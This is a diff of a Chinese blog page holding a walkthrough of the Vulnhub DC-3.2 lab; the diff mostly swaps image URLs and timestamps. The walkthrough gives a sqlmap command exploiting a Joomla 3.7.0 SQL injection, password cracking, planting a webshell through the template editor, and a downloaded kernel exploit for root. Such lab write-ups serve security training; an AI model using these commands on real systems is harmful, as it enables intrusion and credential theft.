@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/e5925563a436d850cfc6184421b9ec77.jpeg">
 <meta property="article:published_time" content="2022-09-07T11:21:52.000Z">
-<meta property="article:modified_time" content="2022-09-07T11:23:12.431Z">
+<meta property="article:modified_time" content="2022-09-17T09:58:58.828Z">
 <meta property="article:author" content="putdown">
 <meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
@@ -60,7 +60,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2022-09-07 19:23:12'
+  postUpdate: '2022-09-17 17:58:58'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -150,7 +150,7 @@
     }
     detectApple()
     })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Putdownd--Blog" type="application/atom+xml">
-</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/126266.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Putdownd--Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub靶机DC系列-DC3.2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-07T11:21:52.000Z" title="发表于 2022-09-07 19:21:52">2022-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-07T11:23:12.431Z" title="更新于 2022-09-07 19:23:12">2022-09-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub靶机DC系列-DC3.2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><ul>
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/126266.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Putdownd--Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub靶机DC系列-DC3.2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-07T11:21:52.000Z" title="发表于 2022-09-07 19:21:52">2022-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-17T09:58:58.828Z" title="更新于 2022-09-17 17:58:58">2022-09-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub靶机DC系列-DC3.2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><ul>
 <li><strong>Name</strong>: DC: 3.2</li>
 <li><strong>Date release</strong>: 25 Apr 2020</li>
 <li><strong>Author</strong>: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li>
@@ -167,59 +167,59 @@
 <p>请注意：报告了 DC-3 无法与 VMware Workstation 一起使用的问题。为了解决这个问题，我建议使用 VirtualBox，但是，我为那些只能使用 VMware 的人创建了一个单独的 DC-3 VMware 版本。</p>
 <p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p>
 <p>安装很简单 - 下载它，解压缩，然后将其导入 VirtualBox，然后就可以了。</p>
-<h2 id="虚拟机设置"><a href="#虚拟机设置" class="headerlink" title="虚拟机设置"></a>虚拟机设置</h2><p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907093401804.png" alt="image-20220907093401804"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907093249198.png" alt="image-20220907093249198"></p>
-<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><h2 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h2><p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907093526692.png" alt="image-20220907093526692"></p>
+<h2 id="虚拟机设置"><a href="#虚拟机设置" class="headerlink" title="虚拟机设置"></a>虚拟机设置</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907093401804.png" alt="image-20220907093401804"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907093249198.png" alt="image-20220907093249198"></p>
+<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><h2 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907093526692.png" alt="image-20220907093526692"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dc-3 ip :192.168.169.224</span><br><span class="line">kali ip :192.168.169.220</span><br></pre></td></tr></table></figure>
 
-<h2 id="扫描IP"><a href="#扫描IP" class="headerlink" title="扫描IP"></a>扫描IP</h2><p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907093928999.png" alt="image-20220907093928999"></p>
+<h2 id="扫描IP"><a href="#扫描IP" class="headerlink" title="扫描IP"></a>扫描IP</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907093928999.png" alt="image-20220907093928999"></p>
 <ul>
 <li>开启了 80 端口 ;直接访问</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907094148779.png" alt="image-20220907094148779"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907094148779.png" alt="image-20220907094148779"></p>
 <h1 id="搜索并利用漏洞"><a href="#搜索并利用漏洞" class="headerlink" title="搜索并利用漏洞"></a>搜索并利用漏洞</h1><ul>
 <li><p>发现是 Joomla 的框架 ; 使用 JoomScan 扫描 Joomla漏洞.</p>
 </li>
 <li><p>kali 没有;需要手动安装.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install joomscan</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907162910717.png" alt="image-20220907162910717"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907162910717.png" alt="image-20220907162910717"></p>
 </li>
 <li><p>查看帮助命令</p>
 </li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -h</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907163047628.png" alt="image-20220907163047628"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907163047628.png" alt="image-20220907163047628"></p>
 <ul>
 <li>开扫</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u 192.168.169.224</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907163547660.png" alt="image-20220907163547660"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907163547660.png" alt="image-20220907163547660"></p>
 <ul>
 <li>搜索可以利用的漏洞</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907163808127.png" alt="image-20220907163808127"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907163808127.png" alt="image-20220907163808127"></p>
 <ul>
 <li>看一下漏洞的路径</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -p 42033.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907164517050.png" alt="image-20220907164517050"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907164517050.png" alt="image-20220907164517050"></p>
 <ul>
 <li>打开文件</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907164440537.png" alt="image-20220907164440537"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907164440537.png" alt="image-20220907164440537"></p>
 <ul>
 <li>发现两个可利用漏洞，一个sql注入，一个XSS，所以SQL注入比较合适，直接查看漏洞利用文本。根据利用文本给出的sqlmap利用方式直接上工具sqlmap。</li>
 <li>直接复制过来把ip改成要攻击的ip.</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.169.224/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907165238494.png" alt="image-20220907165238494"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907165238494.png" alt="image-20220907165238494"></p>
 <ul>
 <li>继续选择数据库</li>
 </ul>
@@ -227,17 +227,17 @@
 
 
 
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907165548619.png" alt="image-20220907165548619"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907165548619.png" alt="image-20220907165548619"></p>
 <ul>
 <li>继续 <code>#__users  </code></li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.169.224/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907170040707.png" alt="image-20220907170040707"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907170040707.png" alt="image-20220907170040707"></p>
 <ul>
 <li>注入查询<code>#__users</code>表的<code>name、password</code>字段</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907170231903.png" alt="image-20220907170231903"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907170231903.png" alt="image-20220907170231903"></p>
 <ul>
 <li>解码</li>
 </ul>
@@ -247,7 +247,7 @@
 <li>新建个文本,把要解密的内容放进去</li>
 <li>使用<code>john</code>来解密</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907170733621.png" alt="image-20220907170733621"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907170733621.png" alt="image-20220907170733621"></p>
 <ul>
 <li>得到密码</li>
 </ul>
@@ -265,23 +265,23 @@
 <ul>
 <li>使用账号密码登录</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907171229118.png" alt="image-20220907171229118"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907171229118.png" alt="image-20220907171229118"></p>
 <ul>
 <li>在编辑器发现提示</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907171515649.png" alt="image-20220907171515649"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907171515649.png" alt="image-20220907171515649"></p>
 <ul>
 <li>发现能插入一句话的地方</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907172137088.png" alt="image-20220907172137088"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907172205831.png" alt="image-20220907172205831"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907172240156.png" alt="image-20220907172240156"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907172920838.png" alt="image-20220907172920838"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907172137088.png" alt="image-20220907172137088"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907172205831.png" alt="image-20220907172205831"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907172240156.png" alt="image-20220907172240156"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907172920838.png" alt="image-20220907172920838"></p>
 <ul>
 <li>使用工具连接</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907173016710.png" alt="image-20220907173016710"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907173040858.png" alt="image-20220907173040858"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907173016710.png" alt="image-20220907173016710"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907173040858.png" alt="image-20220907173040858"></p>
 <ul>
 <li>连接成功</li>
 </ul>
@@ -289,25 +289,25 @@
 <ul>
 <li>查看基本信息</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907173556514.png" alt="image-20220907173556514"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907174605258.png" alt="image-20220907174605258"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907173556514.png" alt="image-20220907173556514"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907174605258.png" alt="image-20220907174605258"></p>
 <ul>
 <li>百度了找着了下使用<code>39772.txt </code>这个</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907175131510.png" alt="image-20220907175131510"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907175211421.png" alt="image-20220907175211421"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907175131510.png" alt="image-20220907175131510"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907175211421.png" alt="image-20220907175211421"></p>
 <ul>
 <li>去下载</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip     </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907175355009.png" alt="image-20220907175355009"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907175355009.png" alt="image-20220907175355009"></p>
 <ul>
 <li>通过<code>蚁剑</code>将这<code>exploit.tar</code>上传至靶机即可。解压———执行compile.sh——执行doubleput——提权成功。</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907191807217.png" alt="image-20220907191807217"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907191827111.png" alt="image-20220907191827111"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/futalk/tuchuang/img/image-20220907191849286.png" alt="image-20220907191849286"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907191807217.png" alt="image-20220907191807217"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907191827111.png" alt="image-20220907191827111"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907191849286.png" alt="image-20220907191849286"></p>
 <ul>
 <li>结束</li>
 </ul>
